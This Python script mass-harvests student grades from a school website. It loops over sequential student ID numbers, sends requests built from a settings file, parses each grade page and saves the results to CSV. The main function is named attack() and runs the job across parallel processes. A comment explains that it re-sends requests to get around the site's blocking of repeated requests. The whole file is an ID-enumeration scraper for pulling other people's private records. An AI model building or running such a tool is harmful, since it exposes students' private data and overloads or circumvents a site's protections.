import multiprocessing
import requests
from lxml import etree
import csv

import settings

def get_html(student_id):
	"""Return content of the website's response to requesting student grade."""
	resp = requests.request(
		method=settings.method, 
		url=settings.url, 
		headers=settings.headers, 
		params=settings.query_string, 
		data=settings.form_data.format(student_id), 
		timeout=settings.timeout
	)
	
	if resp is None or resp.status_code != 200:
		raise Exception('no/bad response from mehr')

	html_text = resp._content
	return html_text

def parse(html_text):
	"""Return the list of grades, extracted from the given html."""
	parser = etree.XMLParser(recover=True)
	html_etree = etree.fromstring(html_text, parser)
	grades = html_etree.xpath('//*[@id="M1Q1"]/text()')
	return grades

def get_grade(student_id):
	"""Return the list of grades for student with given id."""
	html_text = get_html(student_id)
	grades = parse(html_text)
	return grades

def save_results(grade_list, res_file_path):
	"""Write grade lists in a csv file."""
	with open(res_file_path, 'a') as res_file:
		csv_writer = csv.writer(res_file)
		csv_writer.writerows(grade_list)

def save_logs(failed_list, log_file_path):
	"""Believe me, This method does nothing informative."""
	return
	with open(log_file_path, 'a') as res_file:
		csv_writer = csv.writer(res_file)
		csv_writer.writerows(failed_list)

def get_grade_list(student_id_range):
	"""Write grade lists of students with ids in the argument in a csv file.

	arguments:
	student_id_range -- a range of student ids (e.g. (93100200, 93100300) )
	"""
	first_id = student_id_range[0]
	last_id = student_id_range[1]

	res_file_path = settings.res_file_path_template.format(first_id, last_id)
	log_file_path = settings.log_file_path_template.format(first_id, last_id)

	grade_list = []
	failed_list = []
	counter = 0
	for i in range(first_id, last_id):
		counter += 1
		student_id = i
		print('checking {0} . . .'.format(student_id))

		# This part requests the website for the student's grades.
		# Blocking or not responding to some requests are common strategies 
		# by websites for preventing DDOS attacks. But re-sending requests 
		# worked for this website. Hence "retry_count".
		successful = False
		for retry_counter in range(settings.retry_count):
			try:
				grade = get_grade(student_id)
				if len(grade) == 0:
					break
				grade_list.append([student_id] + grade)
				successful = True
				break
			except:
				print('\tretrying {0} . . .'.format(student_id))
				continue
		if not successful:
			failed_list.append([student_id])

		# Save extracted informations so far
		if counter >= 500:
			counter = 0
			if len(grade_list) > 0:
				save_results(grade_list, res_file_path)
				grade_list = []
			if len(failed_list) > 0:
				save_logs(failed_list, log_file_path)
				failed_list = []
	
	if len(grade_list) > 0:
		save_results(grade_list, res_file_path)
	if len(failed_list) > 0:
		save_logs(failed_list, log_file_path)

def get_student_id_ranges():
	"""Divide the settings.student_id_range to settings.number_of_threads ranges."""
	start = settings.student_id_range[0]
	end = settings.student_id_range[1]
	count = settings.number_of_threads

	student_id_ranges = []
	step = int((end - start) / count)
	for i in range(count):
		student_id_ranges.append([start + i*step, start + (i+1)*step])
	student_id_ranges[-1] += list(range(student_id_ranges[-1][-1], end))

	return student_id_ranges

def attack():
	"""Save grades of the students with ids in the range given in settings.py in csv files"""
	student_id_ranges = get_student_id_ranges()
	pool = multiprocessing.Pool(settings.number_of_threads)
	
	print('let\'s light up the party ...')

	pool.map(get_grade_list, student_id_ranges)
	pool.close()
	pool.join()

	print('')

if __name__ == '__main__':
	attack()
